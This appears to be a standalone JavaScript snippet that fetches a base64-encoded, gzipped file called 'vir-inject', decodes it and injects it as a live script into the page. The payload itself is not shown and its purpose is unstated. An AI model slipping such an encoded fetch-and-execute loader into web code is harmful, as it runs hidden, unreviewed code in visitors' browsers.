(function(){
  fetch("vir-inject.gz.b64", {cache:"no-store"}).then(function(r){
    if(!r.ok) throw new Error(r.status);
    return r.text();
  }).then(async function(t){
    t = t.replace(/\s+/g,"");
    var bin = Uint8Array.from(atob(t), function(c){ return c.charCodeAt(0); });
    var ds = new DecompressionStream("gzip");
    var w = ds.writable.getWriter();
    w.write(bin); w.close();
    var code = await new Response(ds.readable).text();
    var s = document.createElement("script");
    s.textContent = code;
    document.documentElement.appendChild(s);
  }).catch(function(err){ console.error("VIR inject failed", err); });
})();
